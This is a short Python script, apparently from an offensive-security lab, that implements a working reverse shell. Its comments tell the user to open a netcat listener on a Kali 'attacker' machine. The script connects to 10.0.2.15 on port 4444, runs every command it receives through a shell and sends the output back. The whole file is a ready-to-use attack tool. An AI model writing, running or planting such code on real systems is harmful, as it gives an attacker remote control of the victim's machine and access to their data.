#!usr/bin/env python3
import socket
import subprocess
import sys


# 1. Create a open port on kali (attackers) machine using netcat
# $ nc -vv -l -p 4444
# nc = netcat, -vv=very verbose, -l=listen, -p=port

# creating a socket : socket.socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(('10.0.2.15',4444))

def execute_command(command:str):
	'''
	executes command and return command's output.
	'''
	return subprocess.check_output(command, shell=True)


while True:
	try:
		command = connection.recv(1024).decode('utf-8')
		command_output = execute_command(command)
		connection.send(command_output)

	except ConnectionResetError:
		print('[-] Lost Connection.')
		sys.exit()

	except Exception as e:
		print('[-] Exception : ' + str(e))


# closing connection.
connection.close()
